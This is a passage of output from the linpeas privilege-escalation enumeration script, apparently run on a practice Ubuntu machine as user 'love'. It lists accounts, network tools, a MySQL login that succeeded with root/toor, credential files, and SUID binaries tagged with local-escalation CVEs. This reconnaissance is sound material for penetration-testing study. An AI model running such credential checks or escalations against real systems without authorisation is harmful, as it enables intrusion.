uid=106(avahi-autoipd) gid=112(avahi-autoipd) groups=112(avahi-autoipd)
uid=107(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=108(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=109(rtkit) gid=114(rtkit) groups=114(rtkit)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(cups-pk-helper) gid=116(lpadmin) groups=116(lpadmin)
uid=111(speech-dispatcher) gid=29(audio) groups=29(audio)
uid=112(whoopsie) gid=117(whoopsie) groups=117(whoopsie)
uid=113(kernoops) gid=65534(nogroup) groups=65534(nogroup)
uid=114(saned) gid=119(saned) groups=119(saned),118(scanner)
uid=115(pulse) gid=120(pulse) groups=120(pulse),29(audio)
uid=116(avahi) gid=122(avahi) groups=122(avahi)
uid=117(colord) gid=123(colord) groups=123(colord)
uid=118(hplip) gid=7(lp) groups=7(lp)
uid=119(geoclue) gid=124(geoclue) groups=124(geoclue)
uid=120(gnome-initial-setup) gid=65534(nogroup) groups=65534(nogroup)
uid=121(gdm) gid=125(gdm) groups=125(gdm)
uid=122(mysql) gid=127(mysql) groups=127(mysql)
uid=123(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=124(lightdm) gid=128(lightdm) groups=128(lightdm)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=999(vboxadd) gid=1(daemon[0m) groups=1(daemon[0m)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 20:52:46 up  1:35,  1 user,  load average: 1.61, 1.21, 1.07                                                            
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
love     pts/0    192.168.45.238   20:45    1:10   0.07s  0.00s w

╔══════════╣ Last logons
love     pts/0        Mon May 15 20:45:05 2023   still logged in                       192.168.45.238                   

wtmp begins Mon May 15 20:45:05 2023

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                       
root             pts/1    127.0.0.1        Thu Jun 16 20:19:06 +0530 2022
love             pts/0    192.168.45.238   Mon May 15 20:45:05 +0530 2023

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)                                                                                                      
                                                                                                                        
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                        


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                      
                             ╚══════════════════════╝                                                                   
╔══════════╣ Useful software
/usr/bin/base64                                                                                                         
/usr/bin/curl
/usr/bin/gcc
/usr/bin/gdb
/usr/bin/make
/bin/nc
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python
/usr/bin/python2
/usr/bin/python2.7
/usr/bin/python3
/usr/bin/python3.6
/usr/bin/socat
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
ii  g++-7                                      7.5.0-3ubuntu1~18.04                                     amd64        GNU C++ compiler
ii  gcc                                        4:7.4.0-1ubuntu2.3                                       amd64        GNU C compiler
ii  gcc-7                                      7.5.0-3ubuntu1~18.04                                     amd64        GNU C compiler
/usr/bin/gcc

╔══════════╣ MySQL version
mysql  Ver 15.1 Distrib 10.1.44-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2                               
MySQL user: user


═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... Yes                                                             
User    Host    authentication_string
root    localhost
newuser localhost
═╣ MySQL connection using root/NOPASS ................. No
                                                                                                                        
╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user         = mysql                                         
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user              = mysql
Found readable /etc/mysql/my.cnf
[client-server]
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

╔══════════╣ Analyzing MariaDB Files (limit 70)
-rw-r--r-- 1 root root 869 Jan 30  2020 /etc/mysql/mariadb.cnf                                                          
[client-server]
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

-rw------- 1 root root 277 Apr  2  2020 /etc/mysql/debian.cnf

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.29 (Ubuntu)                                                                  
Server built:   2020-03-13T12:26:16
httpd Not Found
                                                                                                                        
Nginx version: nginx Not Found
                                                                                                                        
/etc/apache2/conf-available/phpmyadmin.conf-        <IfModule mod_mime.c>
/etc/apache2/conf-available/phpmyadmin.conf:            AddType application/x-httpd-php .php
--
/etc/apache2/conf-available/phpmyadmin.conf-        <FilesMatch ".+\.php$">
/etc/apache2/conf-available/phpmyadmin.conf:            SetHandler application/x-httpd-php
--
/etc/apache2/conf-available/phpmyadmin.conf-        <IfModule mod_mime.c>
/etc/apache2/conf-available/phpmyadmin.conf:            AddType application/x-httpd-php .php
--
/etc/apache2/conf-available/phpmyadmin.conf-        <FilesMatch ".+\.php$">
/etc/apache2/conf-available/phpmyadmin.conf:            SetHandler application/x-httpd-php
--
/etc/apache2/conf-enabled/phpmyadmin.conf-        <IfModule mod_mime.c>
/etc/apache2/conf-enabled/phpmyadmin.conf:            AddType application/x-httpd-php .php
--
/etc/apache2/conf-enabled/phpmyadmin.conf-        <FilesMatch ".+\.php$">
/etc/apache2/conf-enabled/phpmyadmin.conf:            SetHandler application/x-httpd-php
--
/etc/apache2/conf-enabled/phpmyadmin.conf-        <IfModule mod_mime.c>
/etc/apache2/conf-enabled/phpmyadmin.conf:            AddType application/x-httpd-php .php
--
/etc/apache2/conf-enabled/phpmyadmin.conf-        <FilesMatch ".+\.php$">
/etc/apache2/conf-enabled/phpmyadmin.conf:            SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.1.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-enabled/php7.1.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.1.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.1.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-available/php7.1.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-available/php7.1.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.1.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.1.conf:    SetHandler application/x-httpd-php-source
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Oct 20  2019 /etc/apache2/sites-enabled                                                     
drwxr-xr-x 2 root root 4096 Oct 20  2019 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Oct 20  2019 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf                                                                                                                       
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>


-rw-r--r-- 1 root root 1332 Jul 16  2019 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Oct 20  2019 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf                                                                                                                       
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

-rw-r--r-- 1 root root 72426 Oct 20  2019 /etc/php/7.1/apache2/php.ini
allow_url_fopen = On
allow_url_include = On
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 72036 Sep  2  2019 /etc/php/7.1/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On



╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Feb 14  2020 /usr/share/doc/rsync/examples/rsyncd.conf                                      
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Wifi Connections Files (limit 70)
drwxr-xr-x 2 root root 4096 May 27  2020 /etc/NetworkManager/system-connections                                         
drwxr-xr-x 2 root root 4096 May 27  2020 /etc/NetworkManager/system-connections
-rw------- 1 root root 347 May 27  2020 /etc/NetworkManager/system-connections/Wired connection 3
-rw------- 1 root root 347 Apr  9  2020 /etc/NetworkManager/system-connections/Wired connection 2
-rw------- 1 root root 348 Oct 21  2019 /etc/NetworkManager/system-connections/Wired connection 1


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                    
drwxr-xr-x 2 root root 4096 May 27  2020 /etc/ldap

drwxr-xr-x 2 root root 32 Jul  9  2019 /snap/core18/1066/etc/ldap

drwxr-xr-x 2 root root 32 Oct 10  2019 /snap/core18/1223/etc/ldap

drwxr-xr-x 2 root root 32 Jul 10  2019 /snap/gnome-3-28-1804/67/etc/ldap

drwxr-xr-x 2 root root 32 Aug 13  2019 /snap/gnome-3-28-1804/71/etc/ldap


╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                                                             
                                                                                                                        

-rw-r--r-- 1 love love 222 Jun 16  2022 /home/love/.ssh/known_hosts
|1|rViD8fxCqjFXPypHQLj/5zR0GwE=|fwQybekUmOylw6o00EPsfR0XCWI= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO9gF8Fv+Uox9ftsvK/DNkPNObtE4BiuaXjwksbOizwtXBepSbhUTyL5We/fWe7x62XW0CMFJWcuQsBNS7IyjsE=



PermitRootLogin yes
ChallengeResponseAuthentication no
UsePAM yes

══╣ Possible private SSH keys were found!
/etc/ImageMagick-6/mime.xml

══╣ Some certificates were found (out limited):
/etc/pki/fwupd/LVFS-CA.pem                                                                                              
/etc/pki/fwupd-metadata/LVFS-CA.pem
/etc/ssl/certs/ACCVRAIZ1.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AddTrust_External_Root.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/etc/ssl/certs/ca-certificates.crt
4106PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                                                                          
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                        


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Jun 16  2022 /etc/pam.d                                                                     
-rw-r--r-- 1 root root 2133 Mar  4  2019 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open


╔══════════╣ Passwords inside pam.d
/etc/pam.d/lightdm:auth    sufficient      pam_succeed_if.so user ingroup nopasswdlogin                                 

./linpeas.sh: 3672: ./linpeas.sh:  [: not found


╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3612 May 11  2019 /snap/core18/1066/etc/cloud/cloud.cfg                                          
     lock_passwd: True
-rw-r--r-- 1 root root 3612 Oct  4  2019 /snap/core18/1223/etc/cloud/cloud.cfg
     lock_passwd: True
-rw-r--r-- 1 root root 3612 May 16  2019 /snap/core/7270/etc/cloud/cloud.cfg
     lock_passwd: True
-rw-r--r-- 1 root root 3612 Aug 30  2019 /snap/core/7917/etc/cloud/cloud.cfg
     lock_passwd: True

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxrwxrwx 2 love love 4096 Jun 16  2022 /home/love/.local/share/keyrings                                               
drwxr-xr-x 2 root root 200 Jul  9  2019 /snap/core18/1066/usr/share/keyrings
drwxr-xr-x 2 root root 200 Oct 10  2019 /snap/core18/1223/usr/share/keyrings
drwxr-xr-x 2 root root 121 Jun 21  2019 /snap/core/7270/usr/share/keyrings
drwxr-xr-x 2 root root 121 Oct  1  2019 /snap/core/7917/usr/share/keyrings
drwxr-xr-x 3 root root 4096 Apr  8  2020 /usr/lib/python2.7/dist-packages/keyrings
drwxr-xr-x 3 root root 4096 Aug  6  2019 /usr/lib/python3/dist-packages/keyrings
drwxr-xr-x 2 root root 4096 Aug  6  2019 /usr/share/keyrings

-rw------- 1 love love 105 Apr  9  2020 /home/love/.local/share/keyrings/login.keyring

-rwxrwxrwx 1 love love 207 Oct 20  2019 /home/love/.local/share/keyrings/user.keystore


╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                          
passwd file: /etc/passwd
passwd file: /snap/core18/1066/etc/pam.d/passwd
passwd file: /snap/core18/1066/etc/passwd
passwd file: /snap/core18/1066/usr/share/lintian/overrides/passwd
passwd file: /snap/core18/1066/var/lib/extrausers/passwd
passwd file: /snap/core18/1223/etc/pam.d/passwd
passwd file: /snap/core18/1223/etc/passwd
passwd file: /snap/core18/1223/usr/share/lintian/overrides/passwd
passwd file: /snap/core18/1223/var/lib/extrausers/passwd
passwd file: /snap/core/7270/etc/pam.d/passwd
passwd file: /snap/core/7270/etc/passwd
passwd file: /snap/core/7270/usr/share/bash-completion/completions/passwd
passwd file: /snap/core/7270/var/lib/extrausers/passwd
passwd file: /snap/core/7917/etc/pam.d/passwd
passwd file: /snap/core/7917/etc/passwd
passwd file: /snap/core/7917/usr/share/bash-completion/completions/passwd
passwd file: /snap/core/7917/var/lib/extrausers/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                            
netpgpkeys Not Found
netpgp Not Found                                                                                                        
                                                                                                                        
-rw-r--r-- 1 root root 360 Oct 20  2019 /etc/apt/trusted.gpg.d/ondrej_ubuntu_php.gpg
-rw-r--r-- 1 root root 2796 Sep 18  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Sep 18  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Sep 18  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rwxrwxrwx 1 love love 1200 Oct 20  2019 /home/love/.gnupg/trustdb.gpg
-rw-r--r-- 1 root root 7399 Sep 18  2018 /snap/core18/1066/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /snap/core18/1066/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /snap/core18/1066/usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /snap/core18/1066/usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /snap/core18/1066/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 7399 Sep 18  2018 /snap/core18/1223/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /snap/core18/1223/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /snap/core18/1223/usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /snap/core18/1223/usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /snap/core18/1223/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 13395 Jun 21  2019 /snap/core/7270/etc/apt/trusted.gpg
-rw-r--r-- 1 root root 12335 May 19  2012 /snap/core/7270/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 May 19  2012 /snap/core/7270/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 19  2012 /snap/core/7270/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 13395 Oct  1  2019 /snap/core/7917/etc/apt/trusted.gpg
-rw-r--r-- 1 root root 12335 May 19  2012 /snap/core/7917/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 May 19  2012 /snap/core/7917/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 19  2012 /snap/core/7917/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 3267 Jan 10  2019 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 7399 Sep 18  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 2253 Mar 21  2018 /usr/share/keyrings/ubuntu-esm-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-updates-keyring.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2867 Feb 22  2018 /usr/share/popularity-contest/debian-popcon.gpg

drwxrwxrwx 3 love love 4096 Oct 20  2019 /home/love/.gnupg
drwx------ 3 gdm gdm 4096 Oct 20  2019 /var/lib/gdm3/.gnupg


╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 694 May 18  2016 /snap/core/7270/usr/share/bash-completion/completions/postfix                   

-rw-r--r-- 1 root root 694 May 18  2016 /snap/core/7917/usr/share/bash-completion/completions/postfix

-rw-r--r-- 1 root root 675 Apr  2  2018 /usr/share/bash-completion/completions/postfix


╔══════════╣ Analyzing FTP Files (limit 70)
                                                                                                                        


-rw-r--r-- 1 root root 69 Sep  2  2019 /etc/php/7.1/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Mar 20  2020 /etc/php/7.4/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Mar 20  2020 /usr/share/php7.1-common/common/ftp.ini
-rw-r--r-- 1 root root 69 Mar 20  2020 /usr/share/php7.4-common/common/ftp.ini






╔══════════╣ Analyzing Samba Files (limit 70)
-rw-r--r-- 1 root root 188 Apr  1  2018 /usr/share/doc/nautilus-share/examples/smb.conf                                 

╔══════════╣ Analyzing DNS Files (limit 70)
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind                                     
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind




╔══════════╣ Analyzing Interesting logs Files (limit 70)
-rw-r----- 1 root adm 15213986 May 15 20:52 /var/log/apache2/access.log                                                 

-rw-r----- 1 root adm 2321 May 15 20:50 /var/log/apache2/error.log
-rw-r----- 1 mysql adm 0 May 15 19:21 /var/log/mysql/error.log

╔══════════╣ Analyzing Windows Files (limit 70)
                                                                                                                        





















lrwxrwxrwx 1 root root 22 Apr  2  2020 /etc/alternatives/my.cnf -> /etc/mysql/mariadb.cnf
lrwxrwxrwx 1 root root 24 Apr  2  2020 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
-rw-r--r-- 1 root root 83 Apr  2  2020 /var/lib/dpkg/alternatives/my.cnf




-rw-r--r-- 1 root root 516413 Feb 10  2018 /usr/share/gutenprint/5.2/xml/printers.xml

























╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Apr  5  2018 /etc/skel/.bashrc                                                              
-rw-r--r-- 1 root root 3771 Apr  5  2018 /snap/core18/1066/etc/skel/.bashrc
-rw-r--r-- 1 root root 3771 Apr  5  2018 /snap/core18/1223/etc/skel/.bashrc
-rw-r--r-- 1 root root 3771 Sep  1  2015 /snap/core/7270/etc/skel/.bashrc
-rw-r--r-- 1 root root 3771 Sep  1  2015 /snap/core/7917/etc/skel/.bashrc





-rw-r--r-- 1 root root 807 Apr  5  2018 /etc/skel/.profile
-rwxrwxrwx 1 love love 807 Oct 20  2019 /home/love/.profile
-rw-r--r-- 1 root root 807 Apr  5  2018 /snap/core18/1066/etc/skel/.profile
-rw-r--r-- 1 root root 807 Apr  5  2018 /snap/core18/1223/etc/skel/.profile
-rw-r--r-- 1 root root 655 May 10  2019 /snap/core/7270/etc/skel/.profile
-rw-r--r-- 1 root root 655 Jul 13  2019 /snap/core/7917/etc/skel/.profile



-rwxrwxrwx 1 love love 0 Oct 20  2019 /home/love/.sudo_as_admin_successful



                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                      
                      ╚════════════════════════════════════╝                                                            
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                        
-rwsr-xr-x 1 root root 22K Jun 28  2019 /usr/bin/arping                                                                 
-rwsr-xr-x 1 root root 59K Mar 23  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                          
-rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 40K Mar 23  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 44K Mar 23  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 75K Mar 23  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 75K Mar 23  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 146K Jan 31  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root dip 374K Feb 11  2020 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 6.1M Nov 29  2017 /usr/local/Serv-U  --->  FTP_Server<15.1.7(CVE-2019-12181)/Serv-U
-rwsr-xr-x 1 root root 14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42K Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-sr-x 1 root root 10K Dec 18  2019 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 27K Mar  5  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 43K Mar  5  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K Mar 23  2019 /bin/su
-rwsr-xr-x 1 root root 40K Aug 23  2019 /snap/core/7917/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                          
-rwsr-xr-x 1 root root 44K May  8  2014 /snap/core/7917/bin/ping
-rwsr-xr-x 1 root root 44K May  8  2014 /snap/core/7917/bin/ping6
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/7917/bin/su
-rwsr-xr-x 1 root root 27K Aug 23  2019 /snap/core/7917/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Mar 25  2019 /snap/core/7917/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/7917/usr/bin/chsh
-rwsr-xr-x 1 root root 74K Mar 25  2019 /snap/core/7917/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K Mar 25  2019 /snap/core/7917/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 53K Mar 25  2019 /snap/core/7917/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                           
-rwsr-xr-x 1 root root 134K Jun 11  2019 /snap/core/7917/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K Jun 11  2019 /snap/core/7917/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 419K Mar  4  2019 /snap/core/7917/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 105K Oct  1  2019 /snap/core/7917/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)                                                                               
-rwsr-xr-- 1 root dip 386K Jun 12  2018 /snap/core/7917/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 40K May 16  2019 /snap/core/7270/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                          
-rwsr-xr-x 1 root root 44K May  8  2014 /snap/core/7270/bin/ping
-rwsr-xr-x 1 root root 44K May  8  2014 /snap/core/7270/bin/ping6
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/7270/bin/su
-rwsr-xr-x 1 root root 27K May 16  2019 /snap/core/7270/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Mar 25  2019 /snap/core/7270/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/7270/usr/bin/chsh
-rwsr-xr-x 1 root root 74K Mar 25  2019 /snap/core/7270/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K Mar 25  2019 /snap/core/7270/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 53K Mar 25  2019 /snap/core/7270/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                           
-rwsr-xr-x 1 root root 134K Jun 11  2019 /snap/core/7270/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K Jun 11  2019 /snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 419K Mar  4  2019 /snap/core/7270/usr/lib/openssh/ssh-keysign
